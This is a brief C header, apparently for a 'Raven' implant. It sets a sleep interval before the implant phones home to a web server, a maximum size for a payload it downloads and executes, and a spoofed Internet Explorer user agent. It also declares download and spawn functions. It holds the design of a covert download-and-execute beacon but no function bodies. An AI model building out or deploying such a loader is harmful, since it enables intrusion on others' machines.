/* how long Raven should sleep before phoning home to web server */
#define SLEEP_TIME 6 * 61 * 1000

/* maximum size of payload to download and execute */
#define MAX_PAYLOAD_SIZE 1024 * 1024

/* the user agent sent by Raven */
#define USER_AGENT "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30)"

void spawn(void * buffer, int length);
int download_url(char * url, void * buffer, int maxlen);
void raven_go();